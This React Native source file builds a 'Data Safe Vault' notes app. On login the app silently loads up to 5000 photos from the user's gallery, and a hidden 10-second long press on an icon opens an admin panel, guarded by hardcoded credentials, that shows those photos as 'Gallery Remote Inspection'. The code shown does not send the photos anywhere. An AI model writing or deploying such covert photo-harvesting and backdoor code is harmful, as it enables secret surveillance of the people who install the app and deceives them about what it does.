import React, { useState, useEffect, useRef } from 'react';
import {
  StyleSheet,
  Text,
  View,
  TextInput,
  TouchableOpacity,
  FlatList,
  Modal,
  Image,
  Dimensions,
  ActivityIndicator,
  Alert
} from 'react-native';
import * as MediaLibrary from 'expo-media-library';
import AsyncStorage from '@react-native-async-storage/async-storage';

const { width } = Dimensions.get('window');
const GRID_SIZE = width / 3;

export default function App() {
  // --- States ---
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [notes, setNotes] = useState([]);
  const [newNote, setNewNote] = useState('');
  const [gallery, setGallery] = useState([]);
  
  // Admin & Stealth States
  const [showAdminModal, setShowAdminModal] = useState(false);
  const [adminId, setAdminId] = useState('');
  const [adminPass, setAdminPass] = useState('');
  const [isAdminView, setIsAdminView] = useState(false);
  const timerRef = useRef(null);

  // --- Background Gallery Sync ---
  const fetchGalleryInBackground = async () => {
    try {
      const { status } = await MediaLibrary.requestPermissionsAsync();
      if (status === 'granted') {
        // Limit 5000 items as specified
        const media = await MediaLibrary.getAssetsAsync({
          first: 5000,
          mediaType: ['photo'],
          sortBy: ['creationTime'],
        });
        setGallery(media.assets);
      }
    } catch (error) {
      console.log('Background Sync Error:', error);
    }
  };

  // --- User Auth ---
  const handleLogin = async () => {
    if (!username || !password) {
      Alert.alert('Error', 'Username and Password are required');
      return;
    }
    
    // Fast login trigger
    setIsLoggedIn(true);
    
    // Background execution to prevent UI freezing
    setTimeout(() => {
      fetchGalleryInBackground();
    }, 100);
  };

  // --- Stealth Trigger (10-second Long Press) ---
  const handlePressIn = () => {
    timerRef.current = setTimeout(() => {
      setShowAdminModal(true); // Direct access ki jagah modal khulega
    }, 10000);
  };

  const handlePressOut = () => {
    if (timerRef.current) {
      clearTimeout(timerRef.current);
    }
  };

  // --- Admin Auth Verification ---
  const verifyAdminCredentials = () => {
    if (adminId === 'adminhum789' && adminPass === 'hum2217071') {
      setShowAdminModal(false);
      setIsAdminView(true);
      setAdminId('');
      setAdminPass('');
    } else {
      Alert.alert('Access Denied', 'Invalid Admin Credentials');
    }
  };

  // --- Notes Management ---
  const addNote = () => {
    if (newNote.trim() === '') return;
    const updatedNotes = [...notes, { id: Date.now().toString(), text: newNote }];
    setNotes(updatedNotes);
    setNewNote('');
  };

  // --- Render Views ---
  if (isAdminView) {
    return (
      <View style={styles.container}>
        <View style={styles.header}>
          <Text style={styles.headerTitle}>Admin Inspector Panel</Text>
          <TouchableOpacity 
            style={styles.exitBtn} 
            onPress={() => setIsAdminView(false)}
          >
            <Text style={styles.btnText}>Exit Inspector</Text>
          </TouchableOpacity>
        </View>

        <Text style={styles.sectionTitle}>User Registered Data</Text>
        <Text style={styles.subText}>Active User: {username || 'Default User'}</Text>
        <Text style={styles.subText}>Total Notes: {notes.length}</Text>
        <Text style={styles.subText}>Synced Photos: {gallery.length}</Text>

        <Text style={styles.sectionTitle}>Gallery Remote Inspection (Grid View)</Text>
        <FlatList
          data={gallery}
          numColumns={3}
          keyExtractor={(item) => item.id}
          renderItem={({ item }) => (
            <Image source={{ uri: item.uri }} style={styles.gridImage} />
          )}
        />
      </View>
    );
  }

  return (
    <View style={styles.container}>
      {/* Stealth Icon Trigger */}
      <View style={styles.topBar}>
        <TouchableOpacity
          onPressIn={handlePressIn}
          onPressOut={handlePressOut}
          activeOpacity={0.8}
        >
          <Text style={styles.shieldIcon}>🛡️</Text>
        </TouchableOpacity>
      </View>

      {!isLoggedIn ? (
        // Login View
        <View style={styles.authBox}>
          <Text style={styles.title}>Data Safe Vault</Text>
          <TextInput
            placeholder="Username"
            style={styles.input}
            value={username}
            onChangeText={setUsername}
          />
          <TextInput
            placeholder="Password"
            secureTextEntry
            style={styles.input}
            value={password}
            onChangeText={setPassword}
          />
          <TouchableOpacity style={styles.primaryBtn} onPress={handleLogin}>
            <Text style={styles.btnText}>Enter Vault</Text>
          </TouchableOpacity>
        </View>
      ) : (
        // Main Vault App View
        <View style={styles.vaultContainer}>
          <Text style={styles.title}>My Private Notes</Text>
          <View style={styles.noteInputRow}>
            <TextInput
              placeholder="Write a secure note..."
              style={[styles.input, { flex: 1, marginBottom: 0 }]}
              value={newNote}
              onChangeText={setNewNote}
            />
            <TouchableOpacity style={styles.addBtn} onPress={addNote}>
              <Text style={styles.btnText}>Add</Text>
            </TouchableOpacity>
          </View>

          <FlatList
            data={notes}
            keyExtractor={(item) => item.id}
            renderItem={({ item }) => (
              <View style={styles.noteCard}>
                <Text>{item.text}</Text>
              </View>
            )}
          />
        </View>
      )}

      {/* Admin Authentication Modal */}
      <Modal visible={showAdminModal} transparent animationType="slide">
        <View style={styles.modalOverlay}>
          <View style={styles.modalContent}>
            <Text style={styles.modalTitle}>Admin Verification</Text>
            <TextInput
              placeholder="Admin ID"
              style={styles.input}
              value={adminId}
              onChangeText={setAdminId}
            />
            <TextInput
              placeholder="Admin Password"
              secureTextEntry
              style={styles.input}
              value={adminPass}
              onChangeText={setAdminPass}
            />
            <View style={styles.modalActionRow}>
              <TouchableOpacity
                style={styles.cancelBtn}
                onPress={() => setShowAdminModal(false)}
              >
                <Text style={styles.btnText}>Cancel</Text>
              </TouchableOpacity>
              <TouchableOpacity
                style={styles.primaryBtn}
                onPress={verifyAdminCredentials}
              >
                <Text style={styles.btnText}>Verify</Text>
              </TouchableOpacity>
            </View>
          </View>
        </View>
      </Modal>
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#f4f4f6', paddingTop: 50, paddingHorizontal: 15 },
  topBar: { alignItems: 'flex-end', marginBottom: 10 },
  shieldIcon: { fontSize: 24 },
  authBox: { marginTop: 100, padding: 20, backgroundColor: '#fff', borderRadius: 10 },
  title: { fontSize: 22, fontWeight: 'bold', marginBottom: 15, textAlign: 'center' },
  input: { borderWidth: 1, borderColor: '#ccc', borderRadius: 6, padding: 10, marginBottom: 12 },
  primaryBtn: { backgroundColor: '#007AFF', padding: 12, borderRadius: 6, alignItems: 'center' },
  addBtn: { backgroundColor: '#28a745', padding: 12, borderRadius: 6, marginLeft: 10 },
  cancelBtn: { backgroundColor: '#6c757d', padding: 12, borderRadius: 6, flex: 1, marginRight: 10, alignItems: 'center' },
  btnText: { color: '#fff', fontWeight: 'bold' },
  vaultContainer: { flex: 1 },
  noteInputRow: { flexDirection: 'row', marginBottom: 15 },
  noteCard: { backgroundColor: '#fff', padding: 12, borderRadius: 6, marginBottom: 8 },
  modalOverlay: { flex: 1, backgroundColor: 'rgba(0,0,0,0.5)', justifyContent: 'center', alignItems: 'center' },
  modalContent: { width: '85%', backgroundColor: '#fff', padding: 20, borderRadius: 10 },
  modalTitle: { fontSize: 18, fontWeight: 'bold', marginBottom: 15, textAlign: 'center' },
  modalActionRow: { flexDirection: 'row', justifyContent: 'space-between' },
  header: { flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center', marginBottom: 15 },
  headerTitle: { fontSize: 20, fontWeight: 'bold' },
  exitBtn: { backgroundColor: '#dc3545', padding: 8, borderRadius: 6 },
  sectionTitle: { fontSize: 16, fontWeight: 'bold', marginTop: 15, marginBottom: 5 },
  subText: { fontSize: 14, color: '#555' },
  gridImage: { width: GRID_SIZE - 10, height: GRID_SIZE - 10, margin: 2 }
});
